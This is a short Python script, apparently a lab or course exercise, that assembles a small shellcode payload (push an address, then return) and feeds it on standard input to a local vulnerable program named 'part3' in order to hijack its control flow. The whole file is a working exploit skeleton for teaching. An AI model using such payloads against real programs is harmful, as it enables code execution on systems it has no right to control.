import os
import struct
import ctypes
from subprocess import Popen, PIPE, STDOUT
# Please refer to the standard library documentation for more details.

# This code serves as typical template that you might find useful.
# Please feel free to modify in whatever way you deem necessary.

# TIPS: The struct module might prove very useful when dealing with
# byte manipulation.
code = [
    b"\x68\xa5\x88\x04\x08",  # push	0x80488a5
    b"\xc3",  # ret
]
raw = b"".join(code)
payload = struct.pack("6s", raw)

# The following launches the vulnerable program.
p = Popen(['./part3'], stdout=PIPE, stdin=PIPE, stderr=PIPE)

# Here you can input data into the program.
stdout_data = p.communicate(input='{}'.format(payload))[0]

# Here we are just printing out the contents of STDOUT.
print(stdout_data)
